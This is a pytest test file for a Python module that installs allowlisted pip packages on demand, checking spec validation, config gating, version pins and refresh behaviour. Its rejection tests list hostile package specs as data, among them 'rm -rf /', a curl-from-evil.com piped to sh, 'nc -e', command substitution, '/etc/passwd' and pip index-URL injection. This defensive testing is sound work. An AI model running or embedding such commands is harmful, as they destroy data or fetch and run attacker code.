"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations


import pytest

import tools.lazy_deps as ld


# ---------------------------------------------------------------------------
# Spec safety
# ---------------------------------------------------------------------------


class TestSpecSafety:
    @pytest.mark.parametrize("spec", [
        "mistralai>=2.3.0,<3",
        "elevenlabs>=1.0,<2",
        "honcho-ai>=2.2.0,<3",
        "boto3>=1.35.0,<2",
        "mautrix[encryption]>=0.20,<1",
        "google-api-python-client>=2.100,<3",
        "youtube-transcript-api>=1.2.0",
        "qrcode>=7.0,<8",
        "package",  # bare name, no version
        "package==1.0.0",
        "package~=1.0",
    ])
    def test_safe_specs_pass(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        # URL-shaped → rejected (no remote origin override allowed)
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        # File path → rejected
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Shell metacharacters → rejected
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        # Pip flag injection → rejected
        "--index-url=http://evil/",
        "-r requirements.txt",
        # Whitespace control chars → rejected
        "package\nshell-injection",
        "package\rmore",
        # Empty / overly long → rejected
        "",
        "x" * 500,
    ])
    def test_unsafe_specs_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")

    def test_lazy_deps_keys_use_namespace_dot_name(self):
        # Sanity check on the data shape — every key should be at least
        # one dot-separated namespace.
        for key in ld.LAZY_DEPS:
            assert "." in key, f"feature {key!r} should be namespace.name"

    def test_every_lazy_dep_spec_passes_safety(self):
        # Defence in depth — even though specs are author-controlled,
        # the safety regex must accept everything we ship.
        for feature, specs in ld.LAZY_DEPS.items():
            for spec in specs:
                assert ld._spec_is_safe(spec), \
                    f"{feature}: spec {spec!r} fails safety check"

    def test_feature_install_command_returns_pip_invocation(self):
        cmd = ld.feature_install_command("memory.honcho")
        assert cmd is not None
        assert cmd.startswith("uv pip install")
        assert "honcho-ai" in cmd

    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None


# ---------------------------------------------------------------------------
# allow_lazy_installs gating
# ---------------------------------------------------------------------------


class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        # Pretend honcho is missing AND lazy installs are disabled.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)

    def test_disabled_via_env_var(self, monkeypatch):
        monkeypatch.setenv("HERMES_DISABLE_LAZY_INSTALLS", "1")
        # Bypass config layer; the env var alone must disable.
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {"allow_lazy_installs": True}},
        )
        assert ld._allow_lazy_installs() is False

    def test_default_allows(self, monkeypatch):
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {}},
        )
        assert ld._allow_lazy_installs() is True

    def test_config_failure_fails_open(self, monkeypatch):
        # If config can't be read at all, we ALLOW installs rather than
        # blocking the user out of their own backends.
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True


# ---------------------------------------------------------------------------
# ensure() happy/sad paths
# ---------------------------------------------------------------------------


class TestEnsure:
    def test_already_satisfied_is_noop(self, monkeypatch):
        # If the package is importable, ensure() returns without calling pip.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)  # no exception

    def test_install_success_path(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.install", ("zzzfake>=1",))
        # First check sees missing, post-install check sees installed.
        call_count = {"n": 0}

        def fake_satisfied(spec):
            call_count["n"] += 1
            return call_count["n"] > 1  # missing first, installed after

        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        ld.ensure("test.install", prompt=False)

    def test_install_failure_surfaces_pip_stderr(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.fail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(
                False, "", "ERROR: package not found on PyPI"
            ),
        )
        with pytest.raises(ld.FeatureUnavailable, match="pip install failed"):
            ld.ensure("test.fail", prompt=False)

    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        # Pip says success but the package still isn't importable
        # (e.g. site-packages caching, wrong python). Surface this.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)


# ---------------------------------------------------------------------------
# is_available
# ---------------------------------------------------------------------------


class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False

    def test_satisfied_returns_true(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.avail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        assert ld.is_available("test.avail") is True

    def test_missing_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False


# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B — "stale pin" detection)
#
# The original implementation returned True the moment the package name
# was importable, ignoring the spec's version range. That meant pin bumps
# in LAZY_DEPS never propagated to users who already lazy-installed the
# backend at an older version. _is_satisfied now parses the spec and
# checks the installed version against the constraint.
# ---------------------------------------------------------------------------


class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        # Patch at the import site lazy_deps uses (inside the function).
        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.2.0"})
        assert ld._is_satisfied("honcho-ai==2.2.0") is True

    def test_exact_pin_mismatch_returns_false(self, monkeypatch):
        # Installed 2.1.2, spec requires 2.2.0 → False (needs upgrade).
        self._fake_version(monkeypatch, {"honcho-ai": "2.1.2"})
        assert ld._is_satisfied("honcho-ai==2.2.0") is False

    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True

    def test_range_above_returns_false(self, monkeypatch):
        # Installed too new for the upper bound.
        self._fake_version(monkeypatch, {"slack-bolt": "2.0.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is False

    def test_range_below_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.0.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is False

    def test_package_not_installed_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {})
        assert ld._is_satisfied("anthropic==0.86.0") is False

    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint — presence alone counts as satisfied.
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 — the [encryption] block must not
        # confuse the specifier parser.
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False


# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A — hermes update wiring)
# ---------------------------------------------------------------------------


class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []

    def test_finds_features_with_at_least_one_package_installed(self, monkeypatch):
        # Pretend only honcho-ai is installed; nothing else.
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "honcho-ai",
        )
        active = ld.active_features()
        assert "memory.honcho" in active
        # Backends the user never enabled stay quiet.
        assert "memory.hindsight" not in active
        assert "platform.slack" not in active

    def test_multi_package_feature_active_if_any_present(self, monkeypatch):
        # platform.slack has 3 packages; only one needs to be present
        # for the feature to count as active (user activated it before,
        # one transitive may have been uninstalled separately).
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "slack-bolt",
        )
        assert "platform.slack" in ld.active_features()


# ---------------------------------------------------------------------------
# CTranslate2 pin for local STT (faster-whisper backend)
#
# faster-whisper's inference engine is ctranslate2, but faster-whisper only
# FLOORS the dependency (``ctranslate2>=4.0``). That means every lazy
# reinstall path — first-use ``ensure("stt.faster_whisper")`` and the
# ``hermes update`` refresh pass — is otherwise free to pull whatever the
# newest ctranslate2 on PyPI happens to be. A newer ctranslate2 can be
# ABI-incompatible with the CUDA/cuDNN runtime the host was provisioned for
# and silently (or visibly) drops STT down to CPU/int8. We exact-pin
# ctranslate2 to the known-good version in the lazy-deps spec (and, in
# lockstep, the ``voice`` extra in pyproject.toml) so neither install path
# can float it forward.
# ---------------------------------------------------------------------------


CTRANSLATE2_KNOWN_GOOD = "4.7.2"


class TestFasterWhisperCTranslate2Pin:
    def _ct2_specs(self):
        return [
            s for s in ld.LAZY_DEPS["stt.faster_whisper"]
            if ld._pkg_name_from_spec(s) == "ctranslate2"
        ]

    def test_stt_faster_whisper_includes_ctranslate2_guard(self):
        assert self._ct2_specs(), (
            "stt.faster_whisper must pin ctranslate2 — faster-whisper only "
            "floors it, so without this a lazy reinstall floats ctranslate2 "
            "to the newest PyPI release and can break the host CUDA/cuDNN "
            "runtime, dropping STT to CPU."
        )

    def test_ctranslate2_is_exact_pin_not_floating(self):
        # The guard only works if it's an exact ``==`` pin. A bare name,
        # floor (``>=``), compatible-release (``~=``), or comma range would
        # all let lazy install pull a newer ctranslate2.
        for spec in self._ct2_specs():
            tail = ld._specifier_from_spec(spec)
            assert tail.startswith("=="), (
                f"ctranslate2 spec {spec!r} must be an exact `==` pin, not a "
                f"floor/range that lets a lazy reinstall float it forward"
            )
            assert not any(ch in tail for ch in (">", "<", "~", "*", ",")), (
                f"ctranslate2 spec {spec!r} must resolve to a single exact "
                f"version, not a range"
            )

    def test_ctranslate2_pinned_to_known_good_version(self):
        for spec in self._ct2_specs():
            assert ld._specifier_from_spec(spec) == f"=={CTRANSLATE2_KNOWN_GOOD}", (
                f"ctranslate2 must be pinned to the known-good "
                f"{CTRANSLATE2_KNOWN_GOOD} (matched to the host CUDA/cuDNN "
                f"runtime); got {spec!r}"
            )

    def test_ctranslate2_spec_passes_safety(self):
        for spec in self._ct2_specs():
            assert ld._spec_is_safe(spec), \
                f"ctranslate2 spec {spec!r} fails the pip-spec safety check"

    def test_lazy_install_command_carries_ctranslate2_pin(self):
        # The user-facing / manual install command must reproduce the exact
        # pin so a hand-run install can't pull an unconstrained ctranslate2.
        cmd = ld.feature_install_command("stt.faster_whisper")
        assert cmd is not None
        assert f"ctranslate2=={CTRANSLATE2_KNOWN_GOOD}" in cmd, (
            f"lazy/manual install command must carry the exact ctranslate2 "
            f"pin; got: {cmd}"
        )

    def test_newer_installed_ctranslate2_is_treated_as_unsatisfied(self, monkeypatch):
        # Teeth for the guard: with a NEWER ctranslate2 already installed,
        # feature_missing() must flag ctranslate2 so ensure()/refresh reinstall
        # the pinned version instead of leaving the incompatible newer one in
        # place. This is the exact scenario the pin defends against.
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg == "ctranslate2":
                return "4.8.0"  # newer than the known-good pin
            raise PackageNotFoundError(pkg)

        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

        missing = ld.feature_missing("stt.faster_whisper")
        assert any(ld._pkg_name_from_spec(s) == "ctranslate2" for s in missing), (
            "an already-installed newer ctranslate2 must be reported as "
            "unsatisfied so the exact pin is restored on reinstall"
        )


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
        # Matrix E2EE pulls python-olm, which has no native Windows wheel/build
        # path. `hermes update` must not retry that doomed install every run.
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "active_features", lambda: ["platform.matrix"])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        result = ld.refresh_active_features()

        assert result["platform.matrix"].startswith("skipped:")
        assert "unsupported on Windows" in result["platform.matrix"]

    def test_windows_matrix_ensure_fails_before_pip(self, monkeypatch):
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        with pytest.raises(ld.FeatureUnavailable, match="unsupported on Windows"):
            ld.ensure("platform.matrix", prompt=False)

    def test_windows_matrix_already_satisfied_still_works(self, monkeypatch):
        # Do not break users who already have a working Matrix dependency set;
        # only the impossible Windows install/refresh path should be blocked.
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called when Matrix deps are current"),
        )

        ld.ensure("platform.matrix", prompt=False)

    def test_already_current_is_noop(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==1.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.refresh_active_features()
        assert result == {"test.feat": "current"}

    def test_stale_pin_triggers_reinstall(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        # First _is_satisfied check (in feature_missing) says no; after
        # install, post-install check says yes.
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        result = ld.refresh_active_features()
        assert result == {"test.feat": "refreshed"}

    def test_install_failure_recorded_not_raised(self, monkeypatch):
        # A failed refresh must NOT raise out of hermes update.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(
                False, "", "ERROR: PyPI 404 quarantine"
            ),
        )
        result = ld.refresh_active_features()
        assert "test.feat" in result
        assert result["test.feat"].startswith("failed:")
        assert "404 quarantine" in result["test.feat"]

    def test_lazy_installs_disabled_marked_skipped(self, monkeypatch):
        # security.allow_lazy_installs=false → don't error, mark skipped
        # so hermes update can render "respecting your config" message.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        result = ld.refresh_active_features()
        assert "test.feat" in result
        assert result["test.feat"].startswith("skipped:")

    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
        monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
        # a.ok: already satisfied → "current"
        # b.fail: missing + install fails → "failed:"
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")


# ---------------------------------------------------------------------------
# Durable-target constraints (_core_constraints_file)
# ---------------------------------------------------------------------------


class _FakeDist:
    """Minimal importlib.metadata.Distribution stand-in."""

    def __init__(self, name, version, root):
        self.metadata = {"Name": name}
        self.version = version
        self._root = root

    def locate_file(self, path):
        return self._root / path


def _read_constraints(monkeypatch, dists):
    import importlib.metadata as md
    monkeypatch.setattr(md, "distributions", lambda: iter(dists))
    path = ld._core_constraints_file()
    assert path is not None
    try:
        return path.read_text(encoding="utf-8").splitlines()
    finally:
        path.unlink()


class TestCoreConstraintsFile:
    def test_core_packages_are_pinned(self, monkeypatch, tmp_path):
        monkeypatch.delenv(ld._LAZY_TARGET_ENV, raising=False)
        core = tmp_path / "venv" / "site-packages"
        lines = _read_constraints(monkeypatch, [
            _FakeDist("httpx", "0.28.1", core),
            _FakeDist("pydantic", "2.12.0", core),
        ])
        assert lines == ["httpx==0.28.1", "pydantic==2.12.0"]

    def test_stale_target_ctranslate2_not_constrained(self, monkeypatch, tmp_path):
        """A lazy-installed ctranslate2 must not pin the refresh that replaces it.

        Reproduces the durable-target repair deadlock: the store holds 4.9.0
        from an earlier unpinned install, LAZY_DEPS now asks for 4.7.2, and a
        constraints file naming 4.9.0 would make that resolve unsatisfiable.
        """
        core = tmp_path / "venv" / "site-packages"
        target = tmp_path / "lazy-packages"
        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(target))

        lines = _read_constraints(monkeypatch, [
            _FakeDist("httpx", "0.28.1", core),
            # Installed into the durable target by a previous, unpinned run.
            _FakeDist("ctranslate2", "4.9.0", target),
            _FakeDist("faster-whisper", "1.2.1", target),
            # Nested one level down — still inside the target.
            _FakeDist("numpy", "2.3.0", target / "numpy-2.3.0.dist-info"),
        ])

        assert lines == ["httpx==0.28.1"]
        joined = "\n".join(lines)
        assert "ctranslate2" not in joined
        assert "faster-whisper" not in joined
        assert "numpy" not in joined

        # The requested pin is now resolvable against these constraints.
        for spec in ld.LAZY_DEPS["stt.faster_whisper"]:
            assert ld._pkg_name_from_spec(spec) not in joined

    def test_core_copy_wins_over_target_copy(self, monkeypatch, tmp_path):
        # Same package present in both; only the core version is constrained.
        core = tmp_path / "venv" / "site-packages"
        target = tmp_path / "lazy-packages"
        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(target))
        lines = _read_constraints(monkeypatch, [
            _FakeDist("numpy", "2.0.0", core),
            _FakeDist("numpy", "2.4.3", target),
        ])
        assert lines == ["numpy==2.0.0"]

    def test_core_copy_wins_regardless_of_enumeration_order(self, monkeypatch, tmp_path):
        # Target copy enumerated first must still yield the core pin.
        core = tmp_path / "venv" / "site-packages"
        target = tmp_path / "lazy-packages"
        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(target))
        lines = _read_constraints(monkeypatch, [
            _FakeDist("numpy", "2.4.3", target),
            _FakeDist("numpy", "2.0.0", core),
        ])
        assert lines == ["numpy==2.0.0"]

    def test_unlocatable_dist_still_constrained(self, monkeypatch, tmp_path):
        # locate_file() blowing up must not silently drop a core pin.
        target = tmp_path / "lazy-packages"
        monkeypatch.setenv(ld._LAZY_TARGET_ENV, str(target))

        class _Broken(_FakeDist):
            def locate_file(self, path):
                raise OSError("no location")

        lines = _read_constraints(monkeypatch, [_Broken("httpx", "0.28.1", None)])
        assert lines == ["httpx==0.28.1"]

    def test_no_target_configured_pins_everything(self, monkeypatch, tmp_path):
        # Without a durable target, no exclusion applies — every dist is pinned
        # regardless of where it lives (unchanged legacy behavior).
        monkeypatch.delenv(ld._LAZY_TARGET_ENV, raising=False)
        somewhere = tmp_path / "anywhere" / "site-packages"
        lines = _read_constraints(monkeypatch, [
            _FakeDist("httpx", "0.28.1", somewhere),
            _FakeDist("ctranslate2", "4.9.0", somewhere),
        ])
        assert lines == ["ctranslate2==4.9.0", "httpx==0.28.1"]
